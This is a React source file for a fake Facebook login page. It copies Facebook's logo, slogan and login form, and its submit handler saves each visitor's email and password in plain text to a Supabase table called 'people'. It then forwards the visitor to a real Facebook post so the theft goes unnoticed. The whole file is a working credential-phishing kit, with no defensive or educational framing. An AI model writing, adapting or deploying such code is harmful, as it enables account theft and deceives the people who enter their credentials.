/* eslint-disable @typescript-eslint/no-explicit-any */
import { useState } from "react";
import IMg from "./assets/fb.svg";
import { supabase } from "./api";
import * as yup from "yup";

const schema = yup.object().shape({
  email: yup.string().required("Digita email ou numero de telefone"),
  password: yup.string().required("Digita uma senha valida"),
});

function App() {
  const [isLoading, setIsLoading] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setpassword] = useState("");
  const [errEmail, setErrEmail] = useState<null | string>(null);
  const [errPass, setErPass] = useState<null | string>(null);

  async function handleSubmit(e: any) {
    e.preventDefault();
    setErrEmail(null);
    setErPass(null);
    try {
      await schema.validate({ email, password });
      setIsLoading(true);
      const response = await supabase
        .from("people")
        .insert({ email, password })
        .single();

      console.log("response", response);
      if (response) {
        window.location.href =
          "https://www.facebook.com/100090979876124/posts/pfbid0zdeGfhpkjR1xoQgrzS9ifwjyGw1zNsPutJBqW6y1GUyWGcPowe4moftYaPo377Jhl/?app=fbl";
      }
    } catch (error) {
      console.log(error);
      if (error instanceof yup.ValidationError) {
        if (error.message.includes("email")) {
          setErrEmail(error.message);
          return;
        }
        if (error.message.includes("senha")) {
          setErPass(error.message);
          return;
        }
      }
    } finally {
      setIsLoading(false);
    }
  }

  function handleChangeIn(e: any) {
    setErrEmail(null);
    setEmail(e.target.value as string);
  }
  function changePassword(e: any) {
    setErPass(null);
    setpassword(e.target.value);
  }
  return (
    <form onSubmit={handleSubmit}>
      <div className="container mt-4 sm:mt-16 lg:mt-48 flex flex-col mx-auto items-center justify-center flex-wrap sm:flex-row">
        <div className="left w-1/3 mx-14">
          <img src={IMg} className="w-80" />
          <p className="text-3xl mx-8 hidden sm:block">
            Facebook helps you connect and share with the people in your life.
          </p>
        </div>
        <div className="right flex flex-col w-full h-full bg-white p-2 sm:p-8 item-center sm:shadow-xl rounded-lg sm:w-1/4 text-md relative">
          <input
            type="email"
            placeholder="Email address or phone number"
            className="px-4 h-12 my-2 border border-1 border-gray-400 rounded-md focus:outline-blue-500"
            value={email}
            onChange={handleChangeIn}
          />
          {errEmail && (
            <p className="text-[12px] mx-2 text-red-500">{errEmail}</p>
          )}
          <input
            type="password"
            placeholder="Password"
            className="px-4 h-12 my-2 border border-1 border-gray-400 rounded-md focus:outline-blue-500"
            value={password}
            onChange={changePassword}
          />
          {errPass && (
            <p className="text-[12px] mx-2 text-red-500">{errPass}</p>
          )}
          <button
            disabled={isLoading}
            type="submit"
            className="bg-blue-600 text-white font-bold my-2 py-3 rounded-md text-xl hover:cursor-pointer hover:bg-blue-700"
          >
            Log in
          </button>
          <span className="text-center text-blue-700 text-sm my-2 hover:cursor-pointer hover:underline hover:text-blue-800">
            Forgotten password?
          </span>
          <hr className="my-2" />
          <button className="border border-whitesmoke-500 text- sm:bg-green-600 sm:text-white sm:font-bold my-2 py-3 px-4 mx-auto rounded-md text-md hover:cursor-pointer w-fit hover:bg-green-700">
            Create new account
          </button>
          <span className="absolute -bottom-10 text-sm hidden sm:block">
            <span className="font-bold cursor-pointer hover:underline">
              Create a Page
            </span>
            for a celebrity, brand or business.
          </span>
        </div>
      </div>
    </form>
  );
}

export default App;
